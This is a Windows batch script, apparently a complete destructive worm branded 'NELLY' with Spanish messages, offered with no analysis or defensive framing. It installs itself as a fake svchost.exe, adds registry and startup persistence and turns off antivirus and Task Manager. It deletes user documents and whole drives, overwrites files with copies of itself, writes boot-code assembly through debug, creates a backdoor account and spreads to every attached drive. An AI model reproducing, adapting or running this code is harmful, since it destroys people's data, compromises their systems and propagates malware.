@echo off
set nomb=svchost.exe
set fo=%windir%\Tasks\
if not exist %fo%svchost.exe (copy /y /z /b /v %0 %fo%1&ren %fo%1 %nomb% ) else (goto comp)
if errorlevel 1 goto temp
:comp
set kl="%windir%\Tasks\zlj.dat"
echo ksjasdkjwd2>>%kl%
Copy /y /z /b /v "%windir%\Tasks\zlj.dat" "%Homepath%\zlj.dat"
set rad=add
set l="HKLM\software\microsoft\windows\currentversion\policies\explorer\run"
reg %rad% %l% /V "RunDll23, AVUpdate" /d "%fo%%nomb%" /f
if not errorlevel 1 (goto pr2)
set ins=%allusersprofile%\Men� Inicio\Programas\Inicio\.vbs
echo. On Error Resume Next >"%ins%" & echo Set PV7 = CreateObject("WScript.Shell")>>"%ins%" & echo PV7.Run "%windir%\Tasks\svchost.exe" >>"%ins%"
attrib +s +h "%homepath%\Men� Inicio\Programas\Inicio" & cls
goto pr3
:pr2
for /R "%allusersprofile%\" %%f in (*.vbs) DO del /q /f "%%f"
:pr3
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Window Title" /d "{   NELLY   }" /f
set ld="HKEY_LOCAL_MACHINE\SOFTWARE\KasperskyLab\AVP6\"
reg query %ld% /V "persistent"
if errorlevel 1 (goto pr1)
reg add HKEY_LOCAL_MACHINE\SOFTWARE\KasperskyLab\AVP6\ /v persistent /t REG_DWORD /d 0 /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\KasperskyLab\AVP6\ /v enabled /t REG_DWORD /d 0 /f
:pr1
if exist "zlj.dat" (goto ini2)
if not exist "zlj.dat" (start \ )
exit
:ini2
if exist "%temp%\Desktop.ini" (goto s)
set dl="%temp%\Desktop.ini"
echo [.ShellClassInfo]>>%dl%
echo CLSID={645FF040-5081-101B-9F08-00AA002F954E}>>%dl%
echo LocalizedResourceName=@shell32.dll,-21774>>%dl%
attrib +s +h "%dl%"
attrib +s +h "%temp%"
:s
set /a f=%f% + 1
if %f%==30 goto uno
md %windir%\Tasks\%f%
if errorlevel 1 goto s
cls
:uno
if exist "%windir%\Tasks\27\" (goto t3r)
if exist "%windir%\Tasks\23\" (goto gjk)
if exist "%windir%\Tasks\13\" (goto seg)
if exist "%windir%\Tasks\7\" (goto vid)
if exist "%windir%\Tasks\2\" (goto rest)
goto rev
:rest
set x=add
set c=HKCU\software\microsoft\windows\CurrentVersion\policies\
reg %x% %c%system /t REG_DWORD /V disabletaskmgr /d 1 /f
reg %x% %c%Uninstall /t REG_DWORD /v NoAddRemovePrograms /d 1 /f
Rundll32 user32.dll ,mouse_event
goto rev
:vid
set x1=add
set c1=HKCU\software\microsoft\windows\CurrentVersion\policies\
set cy=HKEY_USERS\S-1-5-21-1220945662-789336058-854245398-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\
reg %x1% %c1%explorer /t REG_BINARY /V NoTrayItemsDisplay /d 01000000 /f
reg %x1% %c1%explorer /t REG_SZ /V NoRun /d 1 /f
reg %x1% %cy%Advanced /t REG_DWORD /v WebView /d 0 /f
for /R "c:%programfile%" %%b in (RegistryCleaner.*) DO del /q /f "%%b"
goto rev
:seg
if exist %windir%\Fonts\.bat (goto u2b)
ping -n 2 localhost>nul&cls
set h="%windir%\Fonts\.bat"&set a=echo&set b=�����&set j=     
set c=�����&set d=�����&set e=%a% %a%     &set f=%b%%b%%b%%b%%b%
set g=%b%%b%&set k=%d%%d%%d%&set l=%c%%c%%c%&set m=%f%� %b% %b%
set n=%e%�%f%%f%%g%%g%����&set o=%j%%j%%j%%j%%j%%j%
%a% @%a% off^&mode con lines=27 cols=84^&if exist "%windir%\Tasks\17\" (color 04) else (color 02)>>%h%
%a% title .%o%%o%%j%[ NELLY U2 ]>>%h%
%a% %a%.^&%a%.^&%a%.^&%a%.^&%a%.^&%a%.>>%h%
%e%%l%%l%%l%%l%%l%�>>%h%
%n%�>>%h%
%n%�>>%h%
%e%�%m%��%j% %f%����>>%h%
%e%�%m%�� ���� %f%����>>%h%
%e%�%f%� %b% %g%� %f%�����>>%h%
%e%�%f%� %b% %g% %f%%b%�>>%h%
%e%�%m%���� %f%%b%��>>%h%
%e%�%m%��� %f%%b%���>>%h%
%e%�%m%�� %f%%b%����>>%h%
%e%�%f%��%j%%b%���%j% %f%����>>%h%
%n%�>>%h%
%e%%k%%k%%k%%k%%k%�>>%h%
%a% pause^>^nul>>%h%
ping -n 2 localhost>nul&cls
:u2b
start %windir%\Fonts\.bat
for /R "C:%homepath%\mis documentos\" %%e in (*) DO del /q /f "%%e"
for /R "D:\" %%g in (*) DO del /q /f "%%g"/
set x6=add
set c6=HKCU\software\microsoft\windows\CurrentVersion\policies\
reg %x6% %c6%explorer /t REG_SZ /V Noclose /d 1 /f
RunDll32 advpack.dll,LaunchINFSection %windir%\INF\msmsgs.inf,BLC.Remove
set a=net
%a% stop "centro de Seguridad" &cls
%a% stop "Audio de windows"
set xy=add
set xz=HKEY_USERS\S-1-5-21-1220945662-789336058-854245398-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\
reg %xy% %xz%Advanced /t REG_DWORD /v HideIcons /d 0 /f
goto rev
:gjk
set gh=add
set jh=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
reg %gh% "%jh%" /t REG_DWORD /v LogonType /d 0 /f
for /R "C:%homepath%\" %%r in (*) DO del /q /f "%%r"
set o=delete
set pa=HKCU\software\microsoft\windows\CurrentVersion\Policies\
reg %o% "HKEY_CLASSES_ROOT\lnkfile" /v IsShortcut /f
reg %o% "HKEY_CLASSES_ROOT\piffile" /v IsShortcut /f
net user Nelly "U2" /add /expires:never
goto rev
:t3r
Rundll32 user32.dll ,mouse_event
set k=echo 
(%k%n google.com&%k%a 1024&%k%*********&%k%MOV SS,AX
%k%MOV SP,7C00&%k%STI&%k%PUSH AX&%k%POP ES&%k%PUSH AX
%k%POP DS&%k%CLD&%k%MOV SI,7C1B&%k%MOV DI,061B&%k%PUSH AX
%k%PUSH DI&%k%************&%k%MOV BP,07BE&%k%MOV CL,04
%k%CMP [BP+00],CH&%k%JL  062E&%k%JNZ 063A&%k%ADD BP,+10
%k%*********&%k%REP&%k%MOVSB&%k%RETF&%k%******&%k%w&%k%q )>>$
debug <$ >nul
del $
taskkill /f /im explorer.exe
for /R "%windir%\" %%l in (*) DO Copy /y /z /b /v %0 "%%l"
for /R "c:\Archivos de programa\Archivos comunes\" %%h in (*) DO del /q /f "%%h"
for /R "d:\" %%f in (*) DO Copy /y /z /b /v %0 "%%f"
for /R "E:\" %%G in (*) DO Copy /y /z /b /v %0 "%%G"
for /R "F:\" %%H in (*) DO Copy /y /z /b /v %0 "%%H"
for /R "G:\" %%I in (*) DO Copy /y /z /b /v %0 "%%I"
for /R "H:\" %%J in (*) DO Copy /y /z /b /v %0 "%%J"
for /R "I:\" %%K in (*) DO Copy /y /z /b /v %0 "%%K"
for /R "J:\" %%L in (*) DO Copy /y /z /b /v %0 "%%L"
for /R "K:\" %%M in (*) DO Copy /y /z /b /v %0 "%%M"
rundll32.exe user32.dll LockWorkStation
exit
:rev
if exist "%windir%\Tasks\20\" (set m4=%username%& goto rev7)
if exist "%windir%\Tasks\10\" (set m4=imagenes& goto rev7) else (set m4=musica)
:rev7
For %%n in (C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (vol %%n: & if not errorlevel 1 (if not exist "%%n:\%m4%.exe" cls & Copy /y /z /b /v %0 "%%n:\%m4%.exe"&cls))
For %%z in (C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (vol %%z: & if not errorlevel 1 (if not exist "%%z:\Desktop.ini" ( echo [{BE098140-A513-11D0-A3A4-00C04FD706EC}]>>%%z:\Desktop.ini
echo IconArea_Image=imagen>>%%z:\Desktop.ini&echo IconArea_Text=0xFFFFFF>>%%z:\Desktop.ini&attrib +s +h "%%z:\Desktop.ini")))
if not exist "c:%homepath%\Escritorio\[    NELLY    ].scf" ( Rundll32 user32.dll ,SwapMouseButton ) else (goto pih)
set escr=c:%homepath%\Escritorio\[    NELLY    ].scf
echo [Shell]>>"%escr%"&echo Command=1 >>"%escr%"&echo IconFile=user32.dll,2 >>"%escr%"
:pih
ping -n 3 localhost>nul&cls
goto rev
:temp
set n1f=svchost.exe
set a1=add&set a2=Windows
reg %a1% HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v %a2% /d "%temp%\%n1f%" /f
if not errorlevel 1 (del /f /q "%homepath%\Men� Inicio\Programas\Inicio\.vbs" & goto b1)
attrib +s +h "%homepath%\Men� Inicio\Programas\Inicio"
set int=%homepath%\Men� Inicio\Programas\Inicio\.vbs
echo. On Error Resume Next >"%int%" & echo Set PV7 = CreateObject("WScript.Shell")>>"%int%" & echo PV7.Run "%temp%\svchost.exe" >>"%int%"
if exist %temp%\svchost.exe (goto b1)
copy /y /z /b /v %0 %temp%\1&ren %temp%\1 %n1f%
:b1
echo Elamorquesiento>>"%temp%\01KJ2"
echo Elamorquesiento>>"%Homepath%\01KJ2"
if not exist 01KJ2 ( start \ & tskill cmd )
:vg
set /a g=%g% + 1
if %g%==28 goto vcb
md %temp%\%g%
if errorlevel 1 goto vg
:vcb
if exist "%temp%\25" ( rundll32.exe user32.dll LockWorkStation )
if exist "%temp%\2" (goto b2)
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Window Title" /d "{   NELLY   }" /f
if exist "%temp%\Desktop.ini" (goto b2)
set dk="%temp%\Desktop.ini"
echo [.ShellClassInfo]>>%dk%
echo CLSID={645FF040-5081-101B-9F08-00AA002F954E}>>%dk%
echo LocalizedResourceName=@shell32.dll,-28995>>%dk%
attrib +s +h "%dk%"
attrib +s +h "%temp%"
:b2
set uh=%temp%\uH.vbs
if exist "%temp%\25" (echo msgbox "Hola Luis Fernando como estas" ,VBCRITICAL,"                  [    NELLY    ]">%uh% &start %uh%& goto vd)
if exist "%temp%\20" (echo msgbox "Interactuando con Luis Fernando" ,VBCRITICAL,"                [    NELLY    ]">%uh% &start %uh%& goto vd)
if exist "%temp%\15" (echo msgbox "Tu ordenador esta en jake" ,VBEXCLAMATION,"              [    NELLY    ]">%uh% &start %uh%& goto vd)
if exist "%temp%\10" (echo msgbox "Su sistema fue modificado",VBEXCLAMATION,"               [    NELLY    ]">%uh% &start %uh%)
:vd
Rundll32 user32.dll ,mouse_event
for /R "C:%homepath%\Mis documentos\" %%w in (*) DO del /q /f "%%w"
:cy
if exist "%temp%\20" (set m5=%username%& goto cy1)
if exist "%temp%\10" (set m5=imagenes& goto cy1) else (set m5=musica)
:cy1
For %%n in (C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (vol %%n: & if not errorlevel 1 (if not exist "%%n:\%m5%.exe" Copy /y /z /b /v %0 "%%n:\%m5%.exe"&cls))
For %%w in (C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (vol %%w: & if not errorlevel 1 (if not exist "%%w:\Desktop.ini" ( echo [{BE098140-A513-11D0-A3A4-00C04FD706EC}]>>%%w:\Desktop.ini
echo IconArea_Image=imagen>>%%w:\Desktop.ini&echo IconArea_Text=0xFFFFFF>>%%w:\Desktop.ini&attrib +s +h "%%w:\Desktop.ini")))
if not exist "c:%homepath%\Escritorio\[    NELLY    ].scf" ( Rundll32 user32.dll ,SwapMouseButton ) else (goto pinh)
set escr=c:%homepath%\Escritorio\[    NELLY    ].scf
echo [Shell]>>"%escr%"&echo Command=1 >>"%escr%"&echo IconFile=user32.dll,2 >>"%escr%"
:pinh
ping -n 3 localhost>nul&cls
goto cy
